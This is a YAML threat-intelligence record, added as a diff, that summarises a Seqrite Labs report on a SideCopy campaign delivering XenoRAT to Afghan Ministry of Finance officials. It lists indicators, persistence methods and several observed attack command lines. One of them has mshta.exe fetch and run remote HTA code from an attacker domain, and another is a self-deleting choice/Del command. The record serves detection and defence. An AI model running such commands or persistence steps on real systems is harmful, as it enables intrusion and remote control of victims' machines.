@@ -1,0 +1,89 @@
+title: 'Operation XENOFISCAL: SideCopy APT Targets Afghan Ministry of Finance with
+  XenoRAT'
+description: A Pakistan-linked SideCopy APT campaign delivers XenoRAT 1.8.7 to Afghan
+  Ministry of Finance officials via spear phishing ZIP archives containing malicious
+  LNK files, using mshta.exe LOLBin abuse, multi-stage HTA/JavaScript loaders, .NET
+  deserialization, and registry-based persistence.
+attribution: SideCopy
+malware_families:
+- XenoRAT
+cves: []
+ttps:
+  processes:
+  - mshta.exe
+  - cmd.exe
+  - schtasks.exe
+  command_lines:
+  - cmd /C start C:\Users\Public\USOShared-1de48789-1285\zuidrt.hta
+  - cmd.exe /c start C:\Users\Public\USOShared-1de48789-1285\zuidrt.hta
+  - /C choice /C Y /N /D Y /T 3 & Del
+  - \Windows\System32\mshta.exe https://abing.edu.s1/L3STICue/CTondTya/nden.PN
+  powershell: []
+  scripts:
+  - zuidrt.hta
+  - noway.bat
+  - ugayt.hta
+  - Bugayt.hta
+  registry_keys:
+  - HKLM\SOFTWARE\Microsoft\.NETFramework\v4.0.30319
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  image_loads:
+  - clr.dll
+  - mscoree.dll
+  - WayBroad.dll
+  - Aotestpass.dll
+  network_connections:
+  - mshta.exe -> abimj[.]edu[.]af:443
+  - XenoRAT -> 185.235.137[.]106:443
+  - mshta.exe -> abing.edu.s1:443
+  file_activity:
+  - C:\Users\Public\USOShared-1de48789-1285\zuidrt.hta
+  - ayhui.vmxx
+  persistence:
+  - Registry Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run) with value
+    name Edgre executing cmd /C start C:\Users\Public\USOShared-1de48789-1285\zuidrt.hta
+  - Batch file noway.bat written to user temp directory and executed via hidden process
+    to establish HTA persistence
+  - Scheduled Task named XenoUpdateManager created via schtasks.exe to run executable
+    at user login with highest privileges
+  - Registry Run key at HKCU\Software\Microsoft\Windows\CurrentVersion\Run to execute
+    payload at login without admin rights
+  - Registry Run Keys / Startup Folder (T1547.001)
+  - Scheduled Task (T1053.005)
+  process_relations:
+  - LNK -> mshta.exe
+  - cmd.exe -> mshta.exe
+  - mshta.exe -> cmd.exe
+iocs:
+  hashes:
+  - 194b912c242604d6f9a79369f22338c58a13ce0cc2ed280ce505075808bc2f14
+  - 3b4194bdfe40d94031a94b30397ffd8a4b09d0a4057668e897b8bdcd1703dd01
+  - df9173a28c0b0b878c10a53d35cd7ce6f6ed66d207b6b7c4ff723721f1c027ab
+  - a63e90ee57a1f213a8fe76ef1a6cff5ae9ed7ebceda258431533825e648c0c67
+  - 5833917bd137804f5a021d2cb37adfe5c4b7b67dbb06d59c3b9c5cf393835e45
+  - 99127c8c67d90e2776beeb85281f9c68399bf4567b07a6b638d68b760212e88d
+  - 8f2d979ef33b2900351c94c7335275a9342c75189e1a901998e90a539e944a1a
+  - 0019212f25eb04bbb33bb194879c095265db7855d6003bdd777cf0cbb90eb772
+  - 9ae3d785486022af82ea92e51b26e3f55c1bba88a7be2ad9790f4240e8499d14
+  ip_addresses:
+  - 185.235.137[.]106
+  - 103.132.98[.]224
+  - 103.132.98[.]226
+  domains:
+  - abimj[.]edu[.]af
+  - abing.edu[.]s1
+  - mail.aiu.edu[.]af
+  urls:
+  - hxxp[:]//abimj.edu.af/institute/cloudiyaf/document.pdf
+  - hxxp[:]//abimj.edu.af/institute/cloudiya/
+  - hxxps[:]//abimj[.]edu[.]af/institute/10/
+  - hxxps[:]//abimj[.]edu[.]af/institute/7/
+  - hxxps://mail.aiu.edu[.]af:443/
+authors:
+- Dixit Panchal
+- Vaibhav Krushna Billade
+- Seqrite Labs
+- Seqrite
+reference: https://www.seqrite.com/blog/operation-xenofiscal-sidecopy-deploying-persistent-xenorat-targeting-the-mof-afghanistan/
+date_of_publication: May 29, 2026
+file_creation_date: June 04, 2026
